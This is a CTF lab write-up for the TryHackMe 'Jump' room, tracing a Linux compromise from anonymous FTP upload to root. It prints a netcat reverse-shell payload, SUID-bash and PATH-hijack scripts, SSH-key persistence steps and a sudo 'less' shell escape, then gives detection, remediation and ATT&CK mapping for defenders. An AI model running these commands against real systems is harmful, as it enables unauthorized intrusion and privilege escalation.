# Cyber Exercise Writeup: `<TryHackMe / Jump>`

## BLUF

**Bottom Line Up Front:**  
This exercise demonstrated how anonymous FTP write access, automated script processing, writable service paths, and permissive sudo rules can be chained into full Linux host compromise. Initial access was obtained by uploading a script that was automatically executed as `recon_user`. Subsequent enumeration identified misconfigured automation and sudo rules that enabled escalation through `dev_user`, `monitor_user`, `ops_user`, and finally `root`.

The final outcome was complete administrative compromise of the target system within an authorized TryHackMe training environment.

---

## Executive Summary

**Exercise Name:** `<TryHackMe / Jump>` http://tryhackme.com/room/jump   
**Platform / Environment:** TryHackMe  
**Exercise Type:** CTF / Red Team Training Lab  
**Primary Domain:** Linux Privilege Escalation / Service Misconfiguration  
**Difficulty:** `<Easy>`  
**Date Completed:** `<2026-06-28>`  
**Author:** Justin Applebury  
**Classification / Handling:** Unclassified / Training Only

### Mission Relevance

This exercise reinforces skills relevant to defensive cyberspace operations, adversary emulation, vulnerability validation, and Linux privilege escalation analysis. The attack path highlights how multiple individually simple misconfigurations can compound into complete system compromise when service accounts, file permissions, scheduled automation, and sudo rules are not governed through least privilege.

---

# 1. Scope and Objectives

## Scope

**Target System / Network:** `<Target IP / hostname>`  
**Rules of Engagement:** Authorized TryHackMe lab environment only. Testing was limited to the assigned target host and conducted within the boundaries of the CTF exercise.  
**Assumptions:** The target host was intentionally vulnerable and reachable through the TryHackMe VPN.  
**Limitations:** Testing was limited to available lab access, standard Linux command-line tooling, and exposed target behavior.

## Objectives

- Identify exposed services and potential attack surface.
- Determine likely vulnerabilities or misconfigurations.
- Gain authorized access within exercise boundaries.
- Analyze adversary-relevant techniques.
- Document evidence, commands, and artifacts.
- Identify detection and mitigation opportunities.
- Map activity to relevant frameworks.

---

# 2. Environment Details

| Field | Details |
| --- | --- |
| Target IP / Hostname | `<Target IP>` / `tryhackme-2404` |
| Attacker / Analyst System | Kali Linux / TryHackMe VPN |
| Operating System Identified | Linux |
| Network Segment | TryHackMe VPN Lab Network |
| Tools Used | Nmap, FTP client, Netcat, SSH, pspy, systemctl, find, grep, sed, standard Linux utilities |
| Access Level at Start | Unauthenticated |
| Final Access Level | Root |

---

# 3. BLUF Technical Findings

| Finding | Severity | Operational Impact | Evidence |
| --- | --- | --- | --- |
| Anonymous FTP login was enabled with write access to an upload directory. | High | Allowed unauthenticated users to place files on the target system. | Nmap and FTP enumeration identified anonymous login and writable `incoming` directory. |
| Uploaded FTP scripts were automatically processed and executed as `recon_user`. | Critical | Enabled unauthenticated remote command execution and initial shell access. | Canary output showed script execution as `recon_user`. |
| A writable backup script executed as `dev_user`. | High | Enabled privilege escalation to `dev_user` through script modification. | `/opt/dev/backup.sh` executed appended canary and payload. |
| `healthcheck.service` used unsafe PATH ordering. | High | Enabled PATH hijacking of `ps`, resulting in execution as `monitor_user`. | Service PATH placed `/opt/dev/bin` before `/usr/bin`. |
| `monitor_user` could run `deploy.sh` as `ops_user` with NOPASSWD sudo. | High | Enabled escalation to `ops_user` through writable helper script execution. | `sudo -l` showed `(ops_user) NOPASSWD: /usr/local/bin/deploy.sh`. |
| `ops_user` could run `less` as root with NOPASSWD sudo. | Critical | Enabled root shell through `less` shell escape. | `sudo -l` showed `(root) NOPASSWD: /usr/bin/less`. |

---

# 4. Methodology

## Approach

The assessment followed a structured red-team workflow: reconnaissance, enumeration, vulnerability identification, exploitation validation, post-exploitation enumeration, privilege escalation, defensive mapping, and reporting. Each user context was validated before proceeding to the next escalation path.

## Phases

1. Reconnaissance
2. Enumeration
3. Initial access validation
4. Shell stabilization
5. Local privilege escalation
6. Root compromise
7. Defensive recommendations
8. Reporting

---

# 5. Reconnaissance and Enumeration

## Network Discovery

Initial reconnaissance was performed with Nmap.

```bash
nmap -n -Pn -A -p- <TARGET_IP>
```

<figure>
<img width="1010" height="988" alt="image" src="https://github.com/user-attachments/assets/1cf176ca-a5bf-479e-8843-eccb66e06270" />  
<figcaption>Figure 1. Nmap scan identifying exposed FTP and SSH services.</figcaption>
</figure>

### Command Breakdown

| Option | Purpose |
| --- | --- |
| `-n` | Disables DNS resolution to speed up scanning. |
| `-Pn` | Treats the host as online and skips host discovery. |
| `-A` | Enables OS detection, version detection, default NSE scripts, and traceroute. |
| `-p-` | Scans all TCP ports from 1 through 65535. |

The scan identified two exposed services: FTP and SSH. FTP became the priority because anonymous login was permitted and the `incoming` directory appeared writable.

---

# 6. Initial Access

## Anonymous FTP Access

Anonymous FTP authentication was tested using the common anonymous login pattern.

```bash
ftp <TARGET_IP>
```

<figure>
<img width="434" height="209" alt="image" src="https://github.com/user-attachments/assets/aeb53d98-a7ca-4d84-90b8-8d9dba6aa543" />  <br>
<figcaption>Figure 2. Anonymous FTP login to the target service.</figcaption>
</figure>

FTP directory enumeration identified accessible folders and files.

<figure>
<img width="802" height="460" alt="image" src="https://github.com/user-attachments/assets/03fe7a08-2fc2-4ace-a591-179b7bccd979" />  
<figcaption>Figure 3. FTP directory enumeration showing available folders.</figcaption>
</figure>

A `README.txt` file was retrieved from the FTP server.

<figure>
<img width="459" height="151" alt="image" src="https://github.com/user-attachments/assets/d5b494ae-3944-496a-91a5-be75d9846952" />  
<figcaption>Figure 4. Retrieved README indicating uploaded recon jobs are automatically processed.</figcaption>
</figure>

The README indicated that “recon jobs” placed in `/incoming/` would be automatically processed. This suggested that uploaded files could be executed or parsed by an automated backend process.

## FTP Processor Canary

A canary script was prepared to confirm whether uploaded scripts were executed and to identify the executing user context.

```bash
cat > shell.sh <<'EOF'
#!/bin/sh

OUT="/srv/ftp/incoming/ftp_processor_id.txt"

id > "$OUT"
whoami >> "$OUT"
hostname >> "$OUT"
date >> "$OUT"
chmod 644 "$OUT" 2>/dev/null
EOF
```

<figure>
<img width="470" height="255" alt="image" src="https://github.com/user-attachments/assets/6e6e9fbd-e092-41db-9e56-5e855ba202b3" />  
<figcaption>Figure 5. Canary script prepared to validate FTP processor execution.</figcaption>
</figure>

The script was uploaded as `shell.sh`.

<figure>
<img width="794" height="440" alt="image" src="https://github.com/user-attachments/assets/bcb6dd47-744b-4990-9621-20a71a452dc3" />  
<figcaption>Figure 6. Canary script uploaded to the FTP incoming directory.</figcaption>
</figure>

The processor created `ftp_processor_id.txt`, confirming execution.

<figure>
<img width="805" height="150" alt="image" src="https://github.com/user-attachments/assets/4e3de3cb-f4c4-4053-aa7e-2380abc61fbd" />  
<figcaption>Figure 7. Canary output confirming execution as recon_user.</figcaption>
</figure>

The output showed execution as `recon_user`, with UID/GID `1001`, and confirmed the hostname as `tryhackme-2404`.

## Reverse Shell Execution

After validating script execution, a reverse shell payload was prepared.

```bash
cat > shell.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <VPN_IP> 4444 > /tmp/f
EOF
```

<figure>
<img width="615" height="147" alt="image" src="https://github.com/user-attachments/assets/14d01755-e61d-49fa-801d-8d64f972fe00" />  
<figcaption>Figure 8. Reverse shell payload prepared for FTP processor execution.</figcaption>
</figure>

A Netcat listener was started on the attacker system.

```bash
nc -lnvp 4444
```

<figure>
<img width="377" height="50" alt="image" src="https://github.com/user-attachments/assets/1f33958b-271d-448f-9f8e-556b1eae8ac6" />  
<figcaption>Figure 9. Netcat listener configured on port 4444.</figcaption>
</figure>

The payload was uploaded to the FTP server. When the automated processor executed it, a reverse shell was received as `recon_user`.

<figure>
<img width="798" height="255" alt="image" src="https://github.com/user-attachments/assets/d2b9dc5c-a31b-4198-8cc4-4c33e29c8005" />  
<figcaption>Figure 10. Reverse shell received from the target as recon_user.</figcaption>
</figure>

---

# 7. Shell Stabilization

The initial reverse shell was upgraded to improve interactivity.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

<figure>
<img width="499" height="109" alt="image" src="https://github.com/user-attachments/assets/55a27988-4893-401f-b546-24dba3da4389" />  
<figcaption>Figure 11. Target-side PTY upgrade commands.</figcaption>
</figure>

The local terminal was then placed into raw mode and the backgrounded shell was returned to the foreground.

```bash
stty raw -echo; fg
```

<figure>
<img width="442" height="130" alt="image" src="https://github.com/user-attachments/assets/5beea941-3625-47a7-a30b-439b683c5ea5" />  
<figcaption>Figure 12. Local terminal stabilization commands.</figcaption>
</figure>

This improved usability for command editing, terminal control, and interactive programs.

The `recon_user` flag was retrieved:

```bash
cat /home/recon_user/flag.txt
```

---

# 8. Stable SSH Access as `recon_user`

A local SSH key pair was generated and the public key was added to `recon_user`’s `authorized_keys`.

```bash
rm -f /tmp/reconkey /tmp/reconkey.pub
ssh-keygen -t ed25519 -f /tmp/reconkey -N '' -q

mkdir -p /home/recon_user/.ssh
cat /tmp/reconkey.pub >> /home/recon_user/.ssh/authorized_keys
chmod 700 /home/recon_user/.ssh
chmod 600 /home/recon_user/.ssh/authorized_keys
```

<figure>
<img width="806" height="209" alt="image" src="https://github.com/user-attachments/assets/2c324219-089e-4031-a3a8-5e1df38542f2" />  
<figcaption>Figure 13. SSH key generation and authorized_keys setup for recon_user.</figcaption>
</figure>

SSH was then used to obtain a cleaner session as `recon_user`.

```bash
ssh -i /tmp/reconkey \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  recon_user@127.0.0.1
```

<figure>
<img width="772" height="461" alt="image" src="https://github.com/user-attachments/assets/c455095b-685d-4c18-8ff8-88fe811e7be1" />  
<figcaption>Figure 14. SSH login to localhost as recon_user using the generated key.</figcaption>
</figure>

---

# 9. Local Enumeration

The following commands were used to enumerate running processes, listening services, systemd timers, and active services.

```bash
ps aux
ss -tulpn 2>/dev/null
systemctl list-timers 2>/dev/null
systemctl list-units --type=service 2>/dev/null
```

<figure>
<img width="470" height="82" alt="image" src="https://github.com/user-attachments/assets/d31279ba-945a-4f3f-b714-a374e0c5c735" />  
<figcaption>Figure 15. Initial local enumeration command set.</figcaption>
</figure>

The output identified several services and automation paths of interest.

<figure>
<img width="1211" height="454" alt="image" src="https://github.com/user-attachments/assets/53c18781-b6b9-4aa2-93e2-9a721d730dba" />  
<figcaption>Figure 16. Process and service enumeration output.</figcaption>
</figure>

<figure>
<img width="1208" height="160" alt="image" src="https://github.com/user-attachments/assets/97aba54b-9889-4be0-b13d-18076edcf02e" />  
<figcaption>Figure 17. Systemd service/timer enumeration output.</figcaption>
</figure>

One notable discovery was `healthcheck.service`.

---

# 10. `healthcheck.service` Review

The healthcheck script was inspected and found to execute `ps` repeatedly.

<figure>
<img width="416" height="190" alt="image" src="https://github.com/user-attachments/assets/c8f2cf25-8713-4f3f-8d45-43a8d66ffad7" />  
<figcaption>Figure 18. healthcheck script inspection.</figcaption>
</figure>

The service configuration included an unsafe PATH value:

```text
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
```

<figure>
<img width="537" height="210" alt="image" src="https://github.com/user-attachments/assets/9a537983-40ec-42e9-b073-9a3aef0202be" />  
<figcaption>Figure 19. healthcheck.service configuration showing unsafe PATH order.</figcaption>
</figure>

Because `/opt/dev/bin` appeared before standard binary directories, a malicious executable named `ps` placed in `/opt/dev/bin` would be executed before `/usr/bin/ps`.

At this stage, direct execution and permission changes were not immediately available, so further enumeration was performed.

<figure>
<img width="735" height="82" alt="image" src="https://github.com/user-attachments/assets/26d0c3bf-b924-4eb4-8390-bfcbde7cc22a" />  
<figcaption>Figure 20. Initial permission issue while attempting the PATH hijack.</figcaption>
</figure>

---

# 11. Escalation to `dev_user`

## `/opt/dev` Enumeration

The `/opt/dev` directory and related files were inspected.

```bash
ls -ld /opt /opt/dev /opt/dev/bin
find /opt/dev -maxdepth 3 -ls 2>/dev/null
find / -user dev_user -ls 2>/dev/null | head -100
sed -n '1,240p' /opt/recon/scan_uploads.sh
```

<figure>
<img width="962" height="233" alt="image" src="https://github.com/user-attachments/assets/2aaf4c8a-7f80-474e-bf3e-7c0d9b65dd86" />  
<figcaption>Figure 21. /opt/dev ownership and backup.sh discovery.</figcaption>
</figure>

The enumeration identified `/opt/dev/backup.sh`.

<figure>
<img width="519" height="87" alt="image" src="https://github.com/user-attachments/assets/7d047c8d-e852-4b3c-8311-b5bcc0959ff0" />  
<figcaption>Figure 22. backup.sh contents showing backup behavior.</figcaption>
</figure>

The script appeared to archive `/home/recon_user`.

## Canary Validation

A canary was appended to the backup script to confirm execution context.

```bash
echo 'id > /tmp/dev_backup_id.txt' >> /opt/dev/backup.sh
```

<figure>
<img width="857" height="20" alt="image" src="https://github.com/user-attachments/assets/2559a024-e0a4-43e1-abbe-c42200a207fe" />  
<figcaption>Figure 23. Canary appended to backup.sh.</figcaption>
</figure>

The canary output confirmed execution as `dev_user`.

<figure>
<img width="728" height="63" alt="image" src="https://github.com/user-attachments/assets/5f802272-9e45-4ddc-98be-22ad89b0e94f" />  
<figcaption>Figure 24. Canary output proving backup.sh execution as dev_user.</figcaption>
</figure>

## SUID Bash Payload

The script was modified to create a SUID Bash binary owned by `dev_user`.

```bash
echo 'cp /bin/bash /tmp/devbash; chmod 4755 /tmp/devbash' >> /opt/dev/backup.sh
```

<figure>
<img width="1523" height="503" alt="image" src="https://github.com/user-attachments/assets/361c6666-7f5f-41fa-b039-c4e44286a961" />  
<figcaption>Figure 25. Payload added to create dev_user SUID Bash.</figcaption>
</figure>

Once `/tmp/devbash` was created, it was executed with preserved privileges:

```bash
/tmp/devbash -p
```

<figure>
<img width="1138" height="132" alt="image" src="https://github.com/user-attachments/assets/03e5cf94-f60d-49f6-9c04-9c6b2c902947" />  
<figcaption>Figure 26. devbash execution confirming dev_user privilege escalation.</figcaption>
</figure>

This provided an effective shell as `dev_user`. The flag was retrieved:

```bash
cat /home/dev_user/flag.txt
```

---

# 12. Escalation to `monitor_user`

The earlier PATH hijacking opportunity in `healthcheck.service` was revisited. A malicious `ps` wrapper was written to `/opt/dev/bin/ps`.

```bash
cat > /opt/dev/bin/ps <<'EOF'
#!/bin/bash
id > /tmp/healthcheck_ps_id.txt
whoami >> /tmp/healthcheck_ps_id.txt

cp /bin/bash /tmp/monitorbash
chmod 4755 /tmp/monitorbash

exec /usr/bin/ps "$@"
EOF

chmod +x /opt/dev/bin/ps
```

<figure>
<img width="425" height="213" alt="image" src="https://github.com/user-attachments/assets/40365251-b98b-441f-8779-b017bb7a7c96" />  
<figcaption>Figure 27. Malicious ps wrapper staged in /opt/dev/bin.</figcaption>
</figure>

When `healthcheck.service` executed, it ran the malicious `ps` wrapper as `monitor_user`. The canary confirmed the user context, and `/tmp/monitorbash` was executed:

```bash
/tmp/monitorbash -p
```

<figure>
<img width="1182" height="172" alt="image" src="https://github.com/user-attachments/assets/eac4a00a-444b-462d-8439-63b94627c948" />  
<figcaption>Figure 28. healthcheck canary and monitorbash output confirming monitor_user execution.</figcaption>
</figure>

This provided an effective shell as `monitor_user`. The flag was retrieved:

```bash
cat /home/monitor_user/flag.txt
```

---

# 13. Real SSH Context as `monitor_user`

An initial sudo check from the effective UID shell did not reveal the needed path.

<figure>
<img width="334" height="72" alt="image" src="https://github.com/user-attachments/assets/b40438ad-0402-4433-9a85-749ba58aa17f" />  
<figcaption>Figure 29. Initial sudo check from effective monitor_user context.</figcaption>
</figure>

A real SSH context was established for `monitor_user` by adding an SSH key to `authorized_keys`.

```bash
rm -f /tmp/monkey /tmp/monkey.pub
ssh-keygen -t ed25519 -f /tmp/monkey -N '' -q

mkdir -p /home/monitor_user/.ssh
cat /tmp/monkey.pub >> /home/monitor_user/.ssh/authorized_keys
chmod 700 /home/monitor_user/.ssh
chmod 600 /home/monitor_user/.ssh/authorized_keys
```

<figure>
<img width="815" height="554" alt="image" src="https://github.com/user-attachments/assets/5ba830e9-6028-4761-966b-1367db87bb31" />  
<figcaption>Figure 30. SSH key setup for monitor_user.</figcaption>
</figure>

The key was used to authenticate as `monitor_user`.

```bash
ssh -i /tmp/monkey \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  monitor_user@127.0.0.1
```

<figure>
<img width="1213" height="910" alt="image" src="https://github.com/user-attachments/assets/ad4ea18a-6e7f-489c-a6ba-a3e7175f06c6" />  
<figcaption>Figure 31. SSH login as monitor_user.</figcaption>
</figure>

After logging in with a real `monitor_user` session, sudo permissions were checked again.

```bash
sudo -n -l
```

<figure>
<img width="1183" height="170" alt="image" src="https://github.com/user-attachments/assets/726e3fb6-a927-4d69-bd91-05095ff6fa64" />  
<figcaption>Figure 32. sudo -l revealing monitor_user can run deploy.sh as ops_user.</figcaption>
</figure>

The output showed:

```text
User monitor_user may run the following commands:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

---

# 14. Escalation to `ops_user`

The allowed command was inspected.

```bash
cat /usr/local/bin/deploy.sh
```

The script changed into `/opt/app` and executed `./deploy_helper.sh`.

<figure>
<img width="883" height="75" alt="image" src="https://github.com/user-attachments/assets/5ebe0843-4268-4e78-815f-1c24bf6e67bf" />  
<figcaption>Figure 33. deploy.sh inspection and write restriction.</figcaption>
</figure>

Although `/usr/local/bin/deploy.sh` was not writable, `deploy_helper.sh` was writable by `monitor_user`. The helper was modified to create a SUID Bash binary owned by `ops_user`.

```bash
rm -f /tmp/opsbash

cat > /opt/app/deploy_helper.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/opsbash
chmod 4755 /tmp/opsbash
EOF

chmod +x /opt/app/deploy_helper.sh
sudo -n -u ops_user /usr/local/bin/deploy.sh
/tmp/opsbash -p
```

<figure>
<img width="885" height="381" alt="image" src="https://github.com/user-attachments/assets/af05b9ae-cba0-419a-b09a-b9ff30483570" />  
<figcaption>Figure 34. deploy_helper.sh modification to create ops_user SUID Bash.</figcaption>
</figure>

The resulting shell provided effective `ops_user` privileges.

<figure>
<img width="1189" height="216" alt="image" src="https://github.com/user-attachments/assets/0f53a1c5-a11d-4430-b77d-eddf57dfffa6" />  
<figcaption>Figure 35. ops_user effective shell validation.</figcaption>
</figure>

The `ops_user` flag was retrieved:

```bash
cat /home/ops_user/flag.txt
```

---

# 15. Real SSH Context as `ops_user`

A real SSH session was then established for `ops_user`.

```bash
rm -f /tmp/opskey /tmp/opskey.pub
ssh-keygen -t ed25519 -f /tmp/opskey -N '' -q

mkdir -p /home/ops_user/.ssh
cat /tmp/opskey.pub >> /home/ops_user/.ssh/authorized_keys
chmod 700 /home/ops_user/.ssh
chmod 600 /home/ops_user/.ssh/authorized_keys

ssh -i /tmp/opskey \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  ops_user@127.0.0.1
```

<figure>
<img width="1219" height="1013" alt="image" src="https://github.com/user-attachments/assets/0f39aade-ee1e-498b-8f45-65d68ae7e325" />  
<figcaption>Figure 36. SSH key setup and login as ops_user.</figcaption>
</figure>

The session was validated with `id` and `whoami`. Sudo permissions were then checked.

```bash
sudo -n -l
```

<figure>
<img width="1198" height="273" alt="image" src="https://github.com/user-attachments/assets/3091b99e-e9f5-4cfe-ba5f-940d1e697538" />  
<figcaption>Figure 37. sudo -l revealing ops_user can run less as root.</figcaption>
</figure>

The output showed:

```text
User ops_user may run the following commands:
    (root) NOPASSWD: /usr/bin/less
```

---

# 16. Escalation to Root

Because `less` supports shell escapes, the sudo rule allowed `ops_user` to spawn a root shell.

```bash
touch /tmp/rootbash
sudo -n /usr/bin/less /tmp/rootbash
```

Inside `less`, the following shell escape was entered:

```text
!/bin/bash
```

<figure>
<img width="446" height="216" alt="image" src="https://github.com/user-attachments/assets/6eb876b2-5afc-46ff-b0ee-808c1ef680ff" />  
<figcaption>Figure 38. Root shell via sudo less shell escape.</figcaption>
</figure>

The resulting shell was validated:

```bash
id
whoami
```

The final access level was `root`, and the root flag was retrieved:

```bash
cat /root/flag.txt
```

---

# 17. Attack Path Summary

```text
Anonymous FTP upload
→ Automated FTP script execution as recon_user
→ SSH stabilization as recon_user
→ Writable /opt/dev/backup.sh executed as dev_user
→ SUID Bash shell as dev_user
→ PATH hijack of healthcheck.service through /opt/dev/bin/ps
→ SUID Bash shell as monitor_user
→ Real SSH context as monitor_user
→ monitor_user sudo NOPASSWD to run deploy.sh as ops_user
→ Writable deploy_helper.sh executed by deploy.sh
→ SUID Bash shell as ops_user
→ Real SSH context as ops_user
→ ops_user sudo NOPASSWD to run less as root
→ Root shell through less shell escape
```

---

# 18. MITRE ATT&CK Mapping

| Tactic | Technique | ID  | Observed Activity |
| --- | --- | --- | --- |
| Initial Access | Exploit Public-Facing Application | T1190 | Anonymous FTP upload processing enabled attacker-controlled script execution. |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | Shell scripts were used for command execution and privilege escalation. |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | T1548.003 | Misconfigured sudo rules allowed execution as `ops_user` and root. |
| Privilege Escalation | Hijack Execution Flow: PATH Interception | T1574.007 | Unsafe PATH order allowed hijacking of `ps` in `healthcheck.service`. |
| Defense Evasion | Masquerading | T1036 | A malicious executable was named `ps` to replace expected command behavior. |
| Discovery | Process Discovery | T1057 | `ps aux` and process enumeration were used to identify active services. |
| Discovery | System Service Discovery | T1007 | `systemctl` was used to identify services and timers. |
| Persistence | Account Manipulation: SSH Authorized Keys | T1098.004 | SSH public keys were added to user `authorized_keys` files for stable access. |

---

# 19. Defensive Analysis

## Detection Opportunities

Defenders could identify this activity through the following telemetry:

### FTP Monitoring

- Anonymous FTP authentication events.
- File uploads to writable directories.
- Script files uploaded to FTP paths.
- New output files created in upload directories.

### Suspicious Script Execution

- Shell execution from `/srv/ftp/incoming`.
- Modification of scripts under `/opt`.
- Unexpected writes to `/tmp`.
- Non-root users creating executable payloads.

### SUID Binary Creation

Alert on commands or file events similar to:

```bash
chmod 4755 /tmp/*
```

High-risk indicators include:

- SUID Bash copies in `/tmp`.
- SUID files created outside standard system directories.
- Binaries owned by service accounts with SUID permissions.

### PATH Hijacking

- Services using writable directories in PATH.
- Execution of system utility names from non-standard directories.
- Creation of files such as `/opt/dev/bin/ps`.

### Sudo Abuse

- NOPASSWD sudo execution by non-administrative users.
- Sudo execution of interactive binaries such as `less`.
- Shell escapes from pagers, editors, or interpreters.

---

# 20. Remediation Recommendations

## FTP Hardening

- Disable anonymous FTP unless explicitly required.
- Remove write access from anonymous FTP directories.
- Prevent uploaded files from being executed.
- Place uploaded files in non-executable storage paths.
- Validate and sanitize upload workflows.

## Script and File Permission Controls

- Ensure scheduled scripts are owned by root or the intended service owner.
- Prevent lower-privileged users from modifying scripts executed by higher-privileged users.
- Restrict write access to `/opt` subdirectories.
- Audit service accounts and group memberships.

## Systemd Service Hardening

- Use absolute paths for all binaries in scripts and service files.
- Do not place writable directories early in PATH.
- Apply systemd controls where appropriate:
  - `NoNewPrivileges=true`
  - `ProtectSystem=strict`
  - `ProtectHome=true`
  - `PrivateTmp=true`
  - Restrictive `ReadWritePaths=`

## Sudoers Hardening

- Remove unnecessary NOPASSWD rules.
- Avoid allowing sudo execution of interactive binaries such as `less`, `vim`, `nano`, `man`, `find`, `bash`, and `sh`.
- Avoid sudo rules that execute writable scripts or scripts that call writable helper files.
- Validate all allowed sudo commands against known GTFOBins abuse paths.

---

# 21. Lessons Learned

This exercise showed that complete compromise can result from chaining several smaller weaknesses rather than exploiting a single complex vulnerability. The most important issues were weak FTP controls, unsafe automated processing, writable scripts executed by higher-privileged users, insecure service PATH configuration, and permissive sudo rules.

The biggest operational lesson was the importance of validating real user context. SUID-style shells may provide an effective UID, but some tools and access checks behave differently when the real UID does not match. Establishing real SSH sessions for `monitor_user` and `ops_user` revealed sudo paths that were not initially apparent.

---

# 22. Conclusion

The target was fully compromised through a multi-stage privilege escalation chain beginning with anonymous FTP access and ending with root access through sudo abuse of `less`. The exercise emphasized the need for least privilege, secure automation, hardened service configuration, and careful sudoers review.

From a defensive perspective, the highest-impact mitigations would be disabling anonymous FTP uploads, preventing execution of uploaded content, securing automated scripts, removing writable directories from service PATH values, and eliminating sudo rules for interactive binaries.

---

# Appendix A: Key Commands

## Nmap

```bash
nmap -n -Pn -A -p- <TARGET_IP>
```

## Reverse Shell Listener

```bash
nc -lnvp 4444
```

## Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

## SSH Login Example

```bash
ssh -i /tmp/reconkey \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  recon_user@127.0.0.1
```

## Sudo Enumeration

```bash
sudo -n -l
```

## Root via Less

```bash
sudo -n /usr/bin/less /tmp/rootbash
```

Inside `less`:

```text
!/bin/bash
```

---

# Appendix B: Final User Contexts

| Stage | User Context |
| --- | --- |
| Initial shell | `recon_user` |
| First escalation | `dev_user` |
| Second escalation | `monitor_user` |
| Third escalation | `ops_user` |
| Final access | `root` |
